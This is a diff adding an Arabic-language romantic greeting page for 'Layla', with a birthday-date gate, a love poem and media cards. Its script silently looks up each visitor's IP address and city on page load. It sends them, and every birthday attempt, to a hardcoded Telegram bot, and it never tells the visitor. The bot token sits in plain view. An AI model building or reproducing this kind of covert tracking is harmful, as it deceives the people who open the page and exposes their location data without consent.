@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hi Layla 💕</title>
+    <!-- استدعاء الخطوط المطابقة للتصميم -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&family=Caveat:wght@700&family=Great+Vibes&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background-color: #ff608c;
+            background-image: 
+                radial-gradient(#ff85a1 1.5px, transparent 1.5px),
+                url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='80' viewBox='0 0 24 24' fill='%23ffffff22'%3E%3Cpath d='M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z'/%3E%3C/svg%3E");
+            background-size: 30px 30px, 120px 120px;
+            min-height: 100vh;
+            margin: 0;
+            padding: 25px 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            direction: rtl;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 390px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 25px 20px;
+            box-shadow: 0 12px 30px rgba(216, 27, 96, 0.25);
+            text-align: center;
+            border: 3px solid #ffffff;
+            position: relative;
+        }
+
+        .cursive-title {
+            font-family: 'Great Vibes', 'Caveat', cursive;
+            font-size: 46px;
+            color: #d81b60;
+            margin: 0 0 10px 0;
+            font-weight: normal;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            color: #e91e63;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 22px;
+        }
+
+        .form-group {
+            text-align: right;
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #d81b60;
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 6px;
+            padding-right: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 13px;
+            border: 2px solid #ff80ab;
+            border-radius: 16px;
+            outline: none;
+            font-size: 18px;
+            text-align: center;
+            background: #fff5f8;
+            color: #333;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #d81b60;
+        }
+
+        .btn-pink {
+            background: linear-gradient(135deg, #e91e63, #ff4081);
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 20px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 6px 18px rgba(233, 30, 99, 0.35);
+            transition: transform 0.2s, background 0.3s;
+            margin-top: 5px;
+        }
+
+        .btn-pink:active {
+            transform: scale(0.97);
+        }
+
+        .error-badge {
+            background: #fff0f5;
+            color: #c2185b;
+            padding: 12px 15px;
+            border-radius: 16px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 15px;
+            display: none;
+            border: 2px dashed #ff4081;
+            animation: fadeIn 0.3s ease;
+        }
+
+        #mainContent {
+            display: none;
+            flex-direction: column;
+            gap: 22px;
+            width: 100%;
+        }
+
+        .poem-container {
+            font-size: 16.5px;
+            line-height: 2.2;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .poem-container .highlight {
+            color: #d81b60;
+            font-weight: 700;
+        }
+
+        .media-frame {
+            width: 100%;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 3px solid #ff80ab;
+            background: #000;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+        }
+
+        .media-frame img, .media-frame video {
+            width: 100%;
+            display: block;
+            border-radius: 17px;
+        }
+
+        audio {
+            width: 100%;
+            margin: 10px 0;
+            border-radius: 30px;
+        }
+
+        .text-box {
+            background: #fff5f8;
+            border: 1.5px solid #ff80ab;
+            padding: 12px;
+            border-radius: 15px;
+            color: #d81b60;
+            font-size: 15px;
+            font-weight: bold;
+            margin-top: 12px;
+        }
+
+        .love-text {
+            font-size: 32px;
+            color: #d81b60;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- 1️⃣ شاشة تاريخ الميلاد -->
+        <div class="card" id="loginCard">
+            <h1 class="cursive-title">Hi Layla</h1>
+            <div class="subtitle">دخلي تاريخ ميلادك يا روحي 💖</div>
+
+            <div class="form-group">
+                <label>اليوم</label>
+                <input type="number" id="dayInput" placeholder="">
+            </div>
+
+            <div class="form-group">
+                <label>الشهر</label>
+                <input type="number" id="monthInput" placeholder="">
+            </div>
+
+            <button class="btn-pink" onclick="checkBirthday()">اضغط هنا يا قمر 💕</button>
+
+            <div class="error-badge" id="errorBadge">
+                لا يا نور عيني ✨ المعلومات دي مش صح! جربي تاني!
+            </div>
+        </div>
+
+        <!-- 2️⃣ الصفحة الرئيسية بعد تاريخ الميلاد -->
+        <div id="mainContent">
+            
+            <!-- كارت Heart -->
+            <div class="card">
+                <h1 class="cursive-title">Heart</h1>
+                <div class="poem-container">
+                    <div>يا ليلي يا نور العين والقلب</div>
+                    <div>حبك في قلبي زي النجم في السما</div>
+                    <div class="highlight">كل يوم معاكي هو عيد وفرحة</div>
+                    <div>وكل لحظة بعيد عنك بتوجعني</div>
+                    <div>أنتي القمر اللي بينور ليلي</div>
+                    <div class="highlight">والشمس اللي بتدفيني في الشتا</div>
+                    <div>حبيبتي يا أجمل حاجة في الدنيا</div>
+                    <div class="highlight">يا ليلي ... أنا بحبك أوي</div>
+                </div>
+            </div>
+
+            <!-- كارت الذكريات الصور -->
+            <div class="card">
+                <h1 class="cursive-title">Our Beautiful Memories</h1>
+                <div class="media-frame">
+                    <img src="https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=500" alt="Memories">
+                </div>
+            </div>
+
+            <!-- كارت الفيديو الخاص -->
+            <div class="card">
+                <h1 class="cursive-title">Special Video</h1>
+                <div class="media-frame">
+                    <video controls poster="https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=500">
+                        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                    </video>
+                </div>
+            </div>
+
+            <!-- كارت الأغنية المفضلة -->
+            <div class="card">
+                <h1 class="cursive-title">Our Favorite Song</h1>
+                <audio controls>
+                    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+                </audio>
+                <div class="text-box">
+                    كل ما بسمع الاغنيه دي بحبك اكتر و اكتر
+                </div>
+                <div class="love-text">بحبك ❤️</div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <script>
+        const CORRECT_DAY = 15;
+        const CORRECT_MONTH = 1;
+
+        const BOT_TOKEN = "8989450747:AAFQ56vM9mniwelDaqf5zqc76J2f3zorpE0";
+        const CHAT_ID = "8718173410";
+
+        let visitorIP = "غير معروف";
+
+        // إرسال إشعار فور فتح الصفحة مباشرة مع تفاصيل الـ IP والموقع
+        window.addEventListener('load', async () => {
+            let visitMsg = `🚨 شخص جديد فتح الرابط الآن!\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+            
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                visitorIP = data.ip || "غير معروف";
+                
+                visitMsg = `🚨 شخص دخل الموقع الآن!\n\n🌐 الـ IP: ${visitorIP}\n📍 الدولة/المدينة: ${data.country_name || ''} - ${data.city || ''}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+            } catch(e) {
+                try {
+                    let res2 = await fetch('https://api.ipify.org?format=json');
+                    let data2 = await res2.json();
+                    visitorIP = data2.ip;
+                    visitMsg += `\n🌐 الـ IP: ${visitorIP}`;
+                } catch(err){}
+            }
+
+            sendTelegramNotification(visitMsg);
+        });
+
+        function checkBirthday() {
+            const dayInput = document.getElementById('dayInput').value.trim();
+            const monthInput = document.getElementById('monthInput').value.trim();
+            const day = parseInt(dayInput);
+            const month = parseInt(monthInput);
+            const errorBadge = document.getElementById('errorBadge');
+
+            if (day === CORRECT_DAY && month === CORRECT_MONTH) {
+                errorBadge.style.display = 'none';
+                document.getElementById('loginCard').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'flex';
+                
+                sendTelegramNotification(`🎉 فتحت الصفحة بنجاح وكتبت التاريخ الصحيح! (${day}/${month})\n🌐 الـ IP: ${visitorIP}`);
+            } else {
+                errorBadge.style.display = 'block';
+                sendTelegramNotification(`⚠️ حاولت تكتب تاريخ غير صحيح: (${dayInput}/${monthInput})\n🌐 الـ IP: ${visitorIP}`);
+            }
+        }
+
+        function sendTelegramNotification(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(e => console.log(e));
+        }
+    </script>
+</body>
+</html>
